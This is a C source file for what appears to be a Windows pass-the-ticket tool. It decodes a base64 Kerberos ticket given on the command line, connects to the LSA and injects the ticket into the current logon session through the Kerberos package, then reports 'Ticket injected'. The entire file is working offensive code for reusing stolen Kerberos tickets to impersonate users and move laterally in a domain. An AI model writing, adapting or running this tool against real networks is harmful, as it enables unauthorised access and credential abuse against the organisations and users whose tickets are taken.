#include "ptt.h"
#include "helpers.h"
#include "ntsecapi.h"
#include "handleArgs.h"

#pragma comment (lib, "Secur32.lib")


int getLuid(PLUID luid) {
	TOKEN_STATISTICS tokenStats;
	int tokenLength;

	HANDLE token;
	BOOL status = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token);
	if (!status) {
		DEBUG("Cannot open the process token : %d\n", GetLastError());
		return -1;
	}

	status = GetTokenInformation(token, TokenStatistics, &tokenStats, sizeof(TOKEN_STATISTICS), &tokenLength);
	if (!status) {
		DEBUG("Cannot get token information : %d\n", GetLastError());
		return -1;
	}
	luid->HighPart = tokenStats.AuthenticationId.HighPart;
	luid->LowPart = tokenStats.AuthenticationId.LowPart;
}

int main(int argc, char** argv) {
	Args* args;
	handleArgs(argc, argv, &args);
	if (!Args_hasKey(args, "ticket")) {
		DEBUG("Usage : %s /ticket:b64ticket", argv[0]);
		return 0;
	}

	unsigned int kirbiSize;
	char* ticket;
	Args_getKey(args, "ticket", &ticket);
	unsigned char *kirbiTicket = base64_decode(ticket, strlen(ticket), &kirbiSize);
	if (kirbiSize == 0) {
		DEBUG("[x] Base64 decode failed \n");
		return 0;
	}

	HANDLE lsaHandle = NULL;
	NTSTATUS status = LsaConnectUntrusted(&lsaHandle);
	if (!NT_SUCCESS(status) || !lsaHandle) {
		DEBUG("[x] Cannot connect to LSA provider : %lu\n", LsaNtStatusToWinError(status));
		return 0;
	}

	LSA_STRING lsaString = { 
		.Buffer = "kerberos", 
		.Length = (USHORT)strlen("kerberos"), 
		.MaximumLength = (USHORT)strlen("kerberos") + 1 
	};
	
	ULONG authenticationPackage = 0;
	status = LsaLookupAuthenticationPackage(lsaHandle, &lsaString, &authenticationPackage);
	if (!NT_SUCCESS(status)) {
		DEBUG("[x] Cannot run LsaAuthenticationPackage : %lu\n", LsaNtStatusToWinError(status));
		return 0;
	}

	LUID targetLuid;
	getLuid(&targetLuid);
	KERB_SUBMIT_TKT_REQUEST request = {
		.MessageType = KerbSubmitTicketMessage,
		.KerbCredSize = kirbiSize,
		.KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST),
		.LogonId = targetLuid
	};

	PVOID protocolReturnBuffer = NULL;
	ULONG protocolReturnBufferSize;
	NTSTATUS protocolStatus;
	size_t requestBufferSize = sizeof(request) + kirbiSize;
	unsigned char* requestBuff = calloc(requestBufferSize, sizeof(char));
	if (!requestBuff) {
		DEBUG("[x]Cannot allocate request buffer\n");
		return 0;
	}
	CopyMemory(requestBuff, &request, sizeof(request));
	CopyMemory(requestBuff + request.KerbCredOffset, kirbiTicket, kirbiSize * sizeof(char));

	status = LsaCallAuthenticationPackage(
		lsaHandle, 
		authenticationPackage, 
		requestBuff, 
		requestBufferSize, 
		protocolReturnBuffer, 
		&protocolReturnBufferSize, 
		&protocolStatus
	);

	free(requestBuff);

	if (!NT_SUCCESS(status)) {
		DEBUG("[x] Failed to call authentication package : %lu\n", LsaNtStatusToWinError(status));
		return 0;
	}
	if (!NT_SUCCESS(protocolStatus)) {
		DEBUG("[x] Failed to call authentication package : %lu\n", LsaNtStatusToWinError(protocolStatus));
		return 0;
	}

	DEBUG("[+] Ticket injected !\n");
	LsaDeregisterLogonProcess(lsaHandle);

	return 0;
}